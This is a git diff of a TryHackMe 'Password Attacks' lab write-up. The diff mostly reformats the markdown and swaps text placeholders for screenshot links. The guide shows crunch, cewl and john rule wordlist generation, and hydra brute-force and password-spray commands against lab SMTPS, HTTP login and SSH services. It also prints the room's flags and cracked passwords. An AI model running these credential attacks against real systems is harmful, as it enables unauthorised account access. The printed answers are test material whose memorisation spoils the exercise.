@@ -11,35 +11,12 @@ This guide contains the answer and steps necessary to get to them for the [Passw
 ## Table of contents
 
 - [Password Attacking Techniques](#password-attacking-techniques)
-- [Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists](#password-profiling-#1---default,-weak,-leaked,-combined-,-and-username-wordlists)
-- [Password Profiling #2 - Keyspace Technique and CUPP](#password-profiling-#2---keyspace-technique-and-cupp)
+- [Password Profiling #1 - Default, Weak, Leaked, Combined, and Username Wordlists](#password-profiling-1---default-weak-leaked-combined-and-username-wordlists)
+- [Password Profiling #2 - Keyspace Technique and CUPP](#password-profiling-2---keyspace-technique-and-cupp)
 - [Offline Attacks - Dictionary and Brute-Force](#offline-attacks---dictionary-and-brute-force)
 - [Offline Attacks - Rule-Based](#offline-attacks---rule-based)
 - [Online password attacks](#online-password-attacks)
 - [Password spray attack ](#password-spray-attack)
-
-![Brute Force](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Offline_Brute_Force.png)
-![Dictionary Attack](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Offline_Dictionary_Attack.png)
-![Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Offline_Hash.png)
-![Hash 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Offline_Hash_2.png)
-![Hash Type](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Offline_Hash_Type.png)
-![FTP Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_FTP_Flag.png)
-![HTTP Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Flag.png)
-![HTTP Form](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Form.png)
-![HTTP Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Password.png)
-![HTTP Post Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Post_Flag.png)
-![HTTP Post Form](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Post_Form.png)
-![HTTP Post Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Post_Password.png)
-![John Config](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_John_Config.png)
-![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Nmap.png)
-![Nmap All](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Nmap_All.png)
-![SMTP Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_SMTP_Password.png)
-![Spray Config](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Spray_Config.png)
-![Spray Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Spray_Flag.png)
-![Spray Hydra](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Spray_Hydra.png)
-![Spray SSH Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Spray_SSH_Login.png)
-![Juniper](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Profiling1_Juniper.png)
-![Crunch Lines](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Profiling2_Crunch_Lines.png)
 
 ### Password Attacking Techniques
 
@@ -49,8 +26,7 @@ This guide contains the answer and steps necessary to get to them for the [Passw
 
    ><details><summary>Click for answer</summary>Password Cracking</details>
 
-### Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists
-
+### Password Profiling #1 - Default, Weak, Leaked, Combined, and Username Wordlists
 
 1. What is the Juniper Networks ISG 2000 default password? 
 
@@ -62,8 +38,7 @@ This guide contains the answer and steps necessary to get to them for the [Passw
 
 ### Password Profiling #2 - Keyspace Technique and CUPP
 
-
-1.  Run the following crunch command:crunch 2 2 01234abcd -o crunch.txt. How many words did crunch generate?
+1.  Run the following crunch command: `crunch 2 2 01234abcd -o crunch.txt`. How many words did crunch generate?
 
     After runnning the command we can see in the output how many lines are written to the file.
     
@@ -89,7 +64,7 @@ This guide contains the answer and steps necessary to get to them for the [Passw
 
 ### Offline Attacks - Dictionary and Brute-Force
 
-1.  Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the hash type?
+1. Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the hash type?
 
    We can use `hash-identifier` to find out what hash type this is.
    
@@ -131,7 +106,6 @@ This guide contains the answer and steps necessary to get to them for the [Passw
 
 ### Offline Attacks - Rule-Based
 
-
 1. What syntax would you use to create a rule to produce the following: "S[Word]NN  where N is Number and S is a symbol of !@? 
 
    For this we must use the knowledge we just learned.
@@ -159,30 +133,32 @@ cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/
    nmap -A 10.10.207.111
    ```
    
-   ONLINE NMAP
+   ![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Nmap.png)
    
-   ONLINE NMAP ALL
+   ![Nmap All](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Nmap_All.png)
    
    Looks like anonymous login is allowed.
    
    We can now look for the flag.
    
-   ONLINE FTP FLAG
+   ![FTP Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_FTP_Flag.png)
    
    ><details><summary>Click for answer</summary>THM{d0abe799f25738ad739c20301aed357b}</details>
 
 2. In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against MACHINE_IP:465 (SMTPS).
 
-What is the password? Note that the password format is as follows: [symbol][dictionary word][0-9][0-9].
+   What is the password? Note that the password format is as follows: [symbol][dictionary word][0-9][0-9].
 
+   ```cmd
    sudo vi /etc/john/john.conf
+   ```
    
    ```cmd
    [List.Rules:THM-Password-Attacks]
    Az"[0-9][0-9]" ^[!@]
    ```
    
-   ONLINE JOHN CONFIG
+   ![John Config](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_John_Config.png)
    
    ```cmd
    john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > wordlist.txt
@@ -194,7 +170,7 @@ What is the password? Note that the password format is as follows: [symbol][dict
    hydra -l pittman@clinic.thmredteam.com -P wordlist2.txt smtps://10.10.155.132 -Vv
    ```
 
-   ONLINE SMTP PASSWORD
+   ![SMTP Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_SMTP_Password.png)
 
    ><details><summary>Click for answer</summary>!multidisciplinary00</details>
 
@@ -202,7 +178,7 @@ What is the password? Note that the password format is as follows: [symbol][dict
 
    For this we will use the same word list, but a different username and attack method. We first need to find out what the format of the request is.
    
-   ONLINE HTTP FORM
+   ![HTTP Form](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Form.png)
    
    Here we see the format and the error message we get when attempting to login using wrong credentials.
    
@@ -218,17 +194,17 @@ What is the password? Note that the password format is as follows: [symbol][dict
    S=logout.php
    ```
    
-   ONLINE HTTP PASSWORD
+   ![HTTP Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Password.png)
    
    Now we can login with these credentials and find the flag.
    
-   ONLINE HTTP FLAG
+   ![HTTP Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{33c5d4954da881814420f3ba39772644}</details>
 
 4. Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://MACHINE_IP/login-post/. What is the flag?
 
-Note: use the clinic.lst dictionary in generating and expanding the wordlist!
+   Note: use the clinic.lst dictionary in generating and expanding the wordlist!
 
    First thing we need to do is expand the previously created clinic.lst using johns single-extra rule.
    
@@ -238,7 +214,7 @@ Note: use the clinic.lst dictionary in generating and expanding the wordlist!
    
    We should also check the form page and get the failed login attempt message.
    
-   ONLINE HTTP POST FORM
+   ![HTTP Post Form](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Post_Form.png)
    
    Note: Unfortunately, this again wouldn't work with the F argument. So I opted to use the S argument instead.
       
@@ -248,16 +224,15 @@ Note: use the clinic.lst dictionary in generating and expanding the wordlist!
    hydra -l burgess -P wordlist-http.txt 10.10.155.132 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php"
    ```
    
-   ONLINE HTTP POST PASSWORD
+   ![HTTP Post Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Post_Password.png)
    
    Now we only have to log into the page and get the flag.
    
-   ONLINE HTTP POST FLAG
+   ![HTTP Post Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_HTTP_Post_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{f8e3750cc0ccbb863f2706a3b2933227}</details>
 
 ### Password spray attack 
-
 
 1. Perform a password spraying attack to get access to the SSH://10.10.155.132 server to read /etc/flag. What is the flag?
 
@@ -289,7 +264,7 @@ Note: use the clinic.lst dictionary in generating and expanding the wordlist!
    Az"[0-1][!@]"
    ```
    
-   ONLINE SPRAY CONFIG
+   ![Spray Config](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Spray_Config.png)
    
    Now we can use these 2 lists in hydra to crack the SSH password.
    
@@ -297,11 +272,11 @@ Note: use the clinic.lst dictionary in generating and expanding the wordlist!
    hydra -L usernames-list.txt -P wordlist-spray.txt ssh://10.10.155.132 -T 4     
    ```
    
-   ONLINE SPRAY HYDRA
+   ![Spray Hydra](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Spray_Hydra.png)
    
    Use these to login to SSH.
    
-   ONLINE SPRAY SSH LOGIN
+   ![Spray SSH Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Spray_SSH_Login.png)
    
    Nothing was found in the user folder, so I looked at the history which might give us a hint to the flags location. Lo and behold it did! Otherwise, I would have made a search query for the file using:
    
@@ -309,6 +284,6 @@ Note: use the clinic.lst dictionary in generating and expanding the wordlist!
    find / -name flag 2>/dev/null
    ```
    
-   ONLINE SPRAY FLAG   
+   ![Spray Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/passwordattacks/Password_Attacks_Online_Spray_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{a97a26e86d09388bbea148f4b870277d}</details>
